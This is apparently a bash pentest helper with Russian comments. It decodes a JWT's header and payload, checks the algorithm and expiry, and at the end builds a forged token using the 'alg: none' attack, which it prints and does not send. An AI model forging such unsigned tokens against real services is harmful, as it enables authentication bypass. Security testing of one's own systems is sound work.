#!/bin/bash
JWT_TOKEN=$1
[ -z "$JWT_TOKEN" ] && { echo "Usage: $0 <jwt_token>"; echo "Example: $0 eyJhbGciOi..."; exit 1; }
mkdir -p ~/.shadow_jwt

echo "╔══════════════════════════════════════════════╗"
echo "║   🔐 JWT ANALYZER                           ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Декодируем JWT
echo "[JWT] 🔍 Декодирую токен..."

# Разбиваем на части
HEADER=$(echo "$JWT_TOKEN" | cut -d'.' -f1)
PAYLOAD=$(echo "$JWT_TOKEN" | cut -d'.' -f2)
SIGNATURE=$(echo "$JWT_TOKEN" | cut -d'.' -f3)

# Декодируем Base64
decode_base64() {
    echo "$1" | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "$1" | base64 -d 2>/dev/null
}

echo ""
echo "  📋 HEADER:"
decode_base64 "$HEADER" | sed 's/^/    /'

echo ""
echo "  📋 PAYLOAD:"
decode_base64 "$PAYLOAD" | sed 's/^/    /'

echo ""
echo "  📋 SIGNATURE: ${SIGNATURE:0:20}..."

# Проверяем алгоритм
ALG=$(echo "$HEADER" | base64 -d 2>/dev/null | grep -oP '"alg":"\K[^"]+')
echo ""
echo "  🔐 Алгоритм: $ALG"

# Проверяем уязвимости
echo ""
echo "[JWT] 🎯 Проверяю уязвимости..."

# 1. None algorithm
if [ "$ALG" != "HS256" ] && [ "$ALG" != "RS256" ] && [ "$ALG" != "ES256" ]; then
    echo "  ⚠️ Нестандартный алгоритм: $ALG"
fi

# 2. Проверяем срок действия
EXP=$(echo "$PAYLOAD" | base64 -d 2>/dev/null | grep -oP '"exp":\K[0-9]+')
if [ -n "$EXP" ]; then
    NOW=$(date +%s)
    if [ "$EXP" -lt "$NOW" ]; then
        echo "  ⚠️ Токен ПРОСРОЧЕН (истёк: $(date -d @$EXP 2>/dev/null || echo $EXP))"
    else
        REMAINING=$((EXP - NOW))
        echo "  ✅ Токен действителен ещё ${REMAINING}с ($(($REMAINING / 3600))ч)"
    fi
fi

# 3. None attack попытка
echo ""
echo "[JWT] 🎯 Пробую None-атаку..."
NONE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
NONE_TOKEN="${NONE_HEADER}.${PAYLOAD}."
echo "  Токен с None: ${NONE_TOKEN:0:50}..."

echo ""
echo "[JWT] 📁 ~/.shadow_jwt/"
